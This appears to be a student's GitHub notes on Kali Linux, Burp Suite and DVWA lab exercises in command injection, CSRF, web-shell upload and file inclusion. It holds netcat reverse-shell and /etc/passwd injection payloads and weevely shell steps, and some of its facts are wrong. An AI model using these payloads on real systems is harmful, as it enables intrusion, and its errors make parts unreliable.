# Cyber-Security
## Installing Kali-Linux
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4810e4b6-a12a-41d3-8212-268f5504bdc5)

### Updating Kali Linux
```
apt-get update && apt-get upgrade -y
```
### To know the username of the Kali Linux
```
uname -a
```
## File Architecture of Linux
### Root of Kali Linux
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/f35580b8-5751-483a-abb0-ba7558cb0e94)

### Login as a root user
```
sudo -i
```

### File Permissions
Groups in Linux
1. Admin/ Owner Group
2. User Group
3. Public Group

Modes:
R : Read    : 4
W : Write   : 2  
X : Execute : 1

Example: 6 - To give read and write permission to the admin
Example: 3 - To give write and execute permission to the user
Example: 7 - To give all the permission to the public

Command: ``` chmod 637 filename ```

To know the existing permission: ``` ls -l filename ```

### To create a new file:
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/12da759b-02d1-4185-bdab-c4a0005f04d5)

By default, the permission is 644.
Where a nono command is a text editor

## Burpsuite: To capture a request 
### Burpsuite proxy configuration
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/b305b725-69bf-46d7-9948-ce711c2a2bce)

### Start
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/d9972243-2a50-4f17-8c08-1315f435b68b)

All the requests will be intercepted in the burp suite tool.

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/2b91c003-1049-4852-beeb-f2af41a06c26)

Intercepted request
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c820e253-4010-49a1-92e4-2c2d2994bd8a)

### You can also install Proxy Switcher for Burpsuite
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1185714f-8c93-488f-9ae5-859c86ef73a3)

### Difference between Burpsuite and Wireshark
The wireshark sends packets from one place to another, where we study packets. Using burpsuite, we analyze the requests made by your browser and the server. We don't see requests in the server.

### Linux Commands Cheetsheet
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c22500a1-dcaa-483a-acc1-09ccb7f69479)

## Reconnaissance Methodology & Testing Environment
### Web Pentesting
To check for exploits for different operating systems: https://www.exploit-db.com/

## To use disposable email: getnada

## What are DNS records?
A DNS record is a domain name system that is a naming database where internet domain names are found and matched with their IP addresses. The domain name, along with its IP address, is referred to as the DNS record. </br>
Name Servers: These are responsible for storing DNS data to keep everything working smoothly.</br>
### Common DNS record types:
1. A (Address Record): A record is used to match a domain name to an IPV4 address to retrieve it.</br>
2. AAAA (Quad A): A type of DNS record that points to a domain or subdomain to an IPV6 address. So when someone types that domain or subdomain in the address bar, the browser knows where to go; here, IPV6 addresses are four times larger than IPV4 addresses and contain eight sets of numbers and letters.</br>
3. CNAME record: Points domains or subdomains to another domain.</br>
4. NS record (Name Servers): These are the servers where all the DNS records are stored. In order for a site to be live, we have to properly configure the name servers. Name servers are provided by the domain name registers or hosting providers.</br>
5. MX record (Mail Exchanger): These are used to point your domain to email servers using SMTP (Simple Mail Transfer Protocol). Like a CNAME record, an MX record should always point to another domain. When an email server needs to deliver an email to the recipient, it first needs to know where the recipient's mailbox is located. It does so by asking the DNS server for the server name of the server that has the mailbox.</br>
6. TXT Record (Text Record): These are used for various authentication methods. Used to verify the ownership of the domain and prevent spam by determining if the email is sent from a trusted source.</br>
7. PTR Record (Pointer To a Canonical Name): This is a security tool. They are used to track an IP address to its domain or reverse DNS lookup.</br>
8. SRV Record (generalized service location): Specifies the host and port for specific services such as voice over IP (VoIP). It serves as a starting and ending point for different network traffic.</br>
#### Reference: https://www.youtube.com/watch?v=VMKbwYMoxX4

### Cookie Editor and Cookie Extension
Cookie Editor 
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/49fbf37c-a134-4b68-a2da-ac056b4fca62)
Using Cookie Editor, we can export these cookies
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/b59aeddf-fb9d-4c91-b1b4-20745a7cbfef)
Example:
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/31c2600d-a2c4-4cc9-b607-ebc4f812322a)  </br>

## Burpsuite
### Proxy Module
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/6380f954-c378-44c8-9323-a2fe13791869)</br>
HTTP History in Proxy Module</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e146d18c-e279-4140-bd49-0e7706c694d5)</br>
Request and Response checking that we are getting from the server in HTTP History</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/bbc44bf6-023f-42a0-a50a-4f6466fa0ab1)</br>
### Other Modules like Interceptor</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8451a752-9aae-4d87-b180-714d888dae76) </br>
Repeater: To see the live request and response. Used for testing purposes only.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c3d5a96c-ef94-4728-a306-ce8336087fbc) </br>

### Intruder: Used to give an attack to the target
Intruder is just used for dictionary attacks. Or the attacks related to permutations and combinations. </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8395a87b-a2d0-4c47-b811-d0005c794953)</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/18f4ccc3-3ed4-4c88-b2b0-9aa2bf31c066)</br>
Types of Attacks:</br>
1. Sniper attacks happen when you set the limit. For example, for four digits, it is 1000 - 9999 (Number of combinations available). Here, we can fix a target and attack in case OTP is a four-digit password.</br>
2. Clusterbombing doesn't have anything as a range in there. Here, we can use numbers and alphabets.  </br>

### Comparer compares the difference between data information.
### Decoder 
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4cfa6386-9c4b-4759-bb6d-9b867799b3df)</br>
Example</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c3ab51b0-0803-4ae1-88ba-7427665a438d)</br>

# Web Pentesting

### Starting Apache Server
```
sudo service apache2 start
```
## Installing Apache2 Server
```
sudo apt-get install apache2
```

## Apache 2 Server Running
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8a137c56-e819-4903-a44b-0a99ef7716e8)

### Setting Up DVWA
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/cbb7fce4-b1d8-4c4a-87a1-a25876b7a52b)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/81755d5a-d77b-47bb-b722-2ad6f1db950b)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8b4a008e-c7f1-4b39-beab-55ab534f2469)
### Edit PHP version
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1e7d627a-0880-4640-8ff6-d60965d2be7c)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/71c3073e-98b4-4418-a5f5-ebaede707c21)

### Reloading Apache2 Server
```
sudo service apache2 reload
```

### DVWA installed
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e832204c-cb22-43cd-8ed9-19aec02f00df)

## Command Injection using DVWA with Low Level Security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/34b9008e-a81c-49b2-ac04-4f24ac69ed8e)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c2850104-fc23-4d87-8e69-d39e9bcb9357)
We can see that we are getting successful responses from the website.

## Checking where exactly we are in the command prompt
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/242aed98-9bbe-4bb6-b47f-c170b692c1f5)

## Making a connection inside the shell from WebApp
### How to start your netcat services?
- Go to terminal
```
nc -vv -l -p 8080
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4c7be283-a663-4641-8a6c-d652cecc7f5b)

### Giving connection of the whole server to the terminal
To execute the netcat services -> 192.168.86.226; nc -e /bin/sh 192.168.86.226 8080 </br>
In Linux, netcat is always hosted in the bin folder. </br>
Here, we are making a connection from WebApp to the Operating System. A command in which we will use the IP of our OS to fire on the website by which we will get a connection in our terminal. </br>

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0b1f284b-a82f-4b87-a7a1-e6dbaba39ffe)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/fc70f6a4-d6eb-4c7c-b58c-78b6d87d5f59)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/3d7495bf-0460-4b7f-810f-cad3a109e632)

## Changing the DVWA Security to Medium
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c07cee8b-17fb-4c6b-a6bd-50ef92d9a2a7)

You can start netcat services again.
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5bb1b345-78b6-4196-ac15-c4b5dbfacd23)

Edit command injection source file in DVWA
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/23cb310d-017a-4ba5-bea1-584c3c12b28d)

Making connections over netcat services as well </br>
Command:
```
192.168.86.226 | nc -e /bin/sh 192.168.86.226 8080
```

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4cdd743f-6f9e-4862-a024-100457c575b6)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0f5ff2b3-d064-40f3-96f0-d926a46a7b62)

### Breaching the higher level of security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/f4518d06-9a09-4f3a-b0bc-562cf0431c99)

### Command Injection Source File of DVWA for High Level of Security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e4cd8b9e-7c9a-49a9-9fa8-530b1fd7d06f)
## Blacklist
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/80c0a582-d984-43d1-b026-c0f5a17c55b3)

Command:
```
192.168.86.226|pwd
```

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/ad900b33-00b0-480f-a942-2d17408a48e1)

Making connections over netcat services as well </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/aab6c956-0cff-49c0-81ec-07b3eadc7013)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/881e0076-4fca-45e7-be9a-ac9cbf147416)

Command:
```
192.168.86.226|nc -e /bin/sh 192.168.86.226 8080 -> Not Working
```

### Jumping on to the default password files: from etc folders
From this, we can find the system's default passwords.
```
192.168.86.226|cat /etc/passwd
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/05e3cca3-760f-4070-a743-0be6e8479bb7)

### Web Pentesting
command injection is used to get the connection of the server via arbitrary commands. With the help of arbitrary commands, we can get the reverse connections of the server with the help of netcat services. netcat services are just the higher level of exploitation techniques. The commands above are the post-exploitation technique. 

### Example incident report
link: https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution </br>
link: http://h1.nobbd.de/ </br>
Example report from link 2: type command injection in the search option

### DVWA error: https://medium.com/@wedefiti/dvwa-requested-url-not-found-error-kali-linux-setup-57a43fd33465

## Cross-Site Request Forgery (CSRF)
Change security level as low from impossible. </br>
The advanced level of CSRF is XSRF. </br>

User --> submit token --> Update information form --> Passed to server
In some cases, the server is not taking authentication from the token. Then, we can create a forgery from into our local environment. We can host this forgery form on the website at the token location where it needs to be submitted. This can only be done when the authorization between the token and cookies is not been done</br>

How is this working?</br>
Step 1: we develop and exploit the URL or script.</br>
Step 2: Trick the victim with Auto Submission.</br>

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5a3610fc-621a-40d0-8a37-14c1bbcc8dbd)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/76654d6e-5f51-49b2-8517-05ae35b50364)

Edited HTML File:</br>
Change the password again to see the changes after submitting the form. Check the URL where the form is submitted.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c86f0f75-3954-46a1-8551-f0102a069de6)
Directory where the form is submitted. It is submitted inside CSRF.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1c26f281-ab46-4929-9aee-58cf319e23b4)
Here, we can see that the new password is the password itself.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/87123722-b85c-4711-8644-c2d20823a92a)
Open the csrf.html file in the browser </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/a4da3e70-a5ca-4c34-95ee-2b2c58896d09)
Change the password in the form and submit it. This will redirect to the DVWA page. Here, we can see that from the 2nd party, the form is getting submitted. Here, the server accepts the URL that isn't present. Log out and check the login to see if the password is changed with the HTML file.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5dddbda5-6357-43c7-b215-2dc9f56dcc10)
If the correct tokens are applied, this attack has yet to be executed.</br>

### Auto submitting the form (Post Exploitation Technique)
Here, we can see that everything is redirected.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e7a15bcd-b283-47a1-8024-455c71138b50)
Autosubmission using JavaScript Functions</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/6cd28a0a-f0e9-46a0-87b7-bb763c20b26e)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8a345178-dc1c-4e7e-a65a-a977f02eb376)

# File Upload Vulnerability, Local and Remote File Inclusion (Uploading Malicious Shell)
When you upload a malicious file and upload a shell to get access to all the files.
### Start the Apache services
```
service apache2 start
sudo service mysql start
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5a9b1923-34c2-41d4-8538-1c152cd30bc2)

Here, we can see that the password of DVWA is changed using the CSRF attack.
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/706b8418-132c-4533-a93a-1953818e1385)

### Making a custom shell in Kali
To create a shell, we use a tool called weevely. We can generate a shell from weevely tool. </br>
### Generating a new shell from weevely
```
sudo weevely generate 123123 /rrot/Desktop/shell.php
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/943ed16c-bfb3-4383-80f2-921988517a5d)

### Downloading the shell from the browser
GitHub Link: https://github.com/4Hackerz/C99-Shell
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5b871d47-688b-4e74-bb22-a770d7b360db)

Here, we are trying to penetrate the c99.php file, which is a malicious file. Change the security level to low</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0d7af7ef-a84f-4751-9cfa-482521e5bdc1)

If the DVWA File Upload option is not uploading any PHP file, we can rename the file to .php or manipulate the extensions. We can do that with the burpsuite. 

Updated weevely command
```
sudo weevely generate 123123 /home/shell.php
```

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/9bdf11fc-8117-467d-9506-4e7ccc64752f)

## Uploading an image in DVWA for checking
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8dfed14d-11ad-41b4-9b7f-5fb4754a9514)

Rename php extension to jpeg for uploading the shell file to DVWA.
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/598c1a1f-5d0b-4d65-b566-e7cf348b41ba)

## Use burpsuite to intercept file upload request
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/156847d6-3021-4bf7-80d9-a02a604b0111)

Here, we upload a simple that is called shell.php. When we try to upload the file, we see a lot of filters. (like only jpg are allowed). We upload the file into a web app, so we are trying to bypass the filter programming and intercept in between with burp suite. Then, we rename the file to shell.php. 

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/43ab96ea-eeaa-41ef-a6c9-cc00c174b0bc)

Upload the file as shown and see the intercepted request in the burp suite. </br>

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c5145338-5547-432a-bc9d-f261896c14c9)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/299a6a8c-7ce4-4f61-a756-4968af022736)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1d029a21-3326-4b65-a832-2e224be29c47)
Intercept the request in the burp suite. Change the name of the file to c99.php from c99.php.jpg. Then, forward the shell to .php over the network. Rename the file name to JEPG or PNG image format.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/18e43aa1-ac87-4090-9c35-2092705a5d65)

### File Upload Vurnability Steps:
Step 1 : weevely generate 123123 /home/Desktop/shell.php </br>
Step 2 : Rename file shell.php.png </br>
Step 3 : Intercept on file upload functionality  </br>
Step 4 : Change the name of file in the request of burpsuite to shell.php </br>
</br></br>
Post Exploitation technique </br>
Step 5 : weevely  paste link/URL where the file is uploaded 123123 </br>

### Change the security level to impossible and check the source code for file vulnerability
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/06c5f3be-ccbe-4f45-8b8b-ca1bdb906a9f)

## File Inclusion Vulnerability
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c228c2a1-70bf-4ee0-983f-f03fee1e4eeb)

Types of file inclusions: </br>
1. Local file inclusion </br>
2. Remote file inclusion </br>

When opening up these files, they are hosted in the same directory that is inside the Vurnebalities folder. Inside this folder, we have a lot of files.   </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/edfa3d2d-70a0-47e8-8ea5-8d26ef7a5236) </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0a05fd4c-29ba-47a1-a34e-83bc959bce67) </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/93ec98c1-4209-4943-af34-a4a0a7549f1c) </br>

### Rotating inside the directory using the URL path of the file location
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/88f9cf71-a759-43a7-8f9c-95546f83354c) </br>

Change the DVWA Security Level to low. </br>
### Response
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/3828d1d9-2545-4274-a992-263d065842b2) </br>
Here, the server is responding to the queries in the DVWA URL, which is dangerous. </br>
Google is served inside our DVWA. In the same way, people can use the website as a proxy by hiding their IP addresses. </br>  

## Remote File Inclusion
Remote file inclusion is one of the deadly attacks. This can keep the server administrator in trouble. We use the whole website as a proxy in case of remote file inclusion, which is done for malicious activities. </br>
RFI is working as a proxy for the website. </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/509a31ed-f503-45c5-a2f7-bdd88ea54a63)
This means we are trying to open a file that is not situated on the website but displayed on your website. </br>

# Wireshark



































































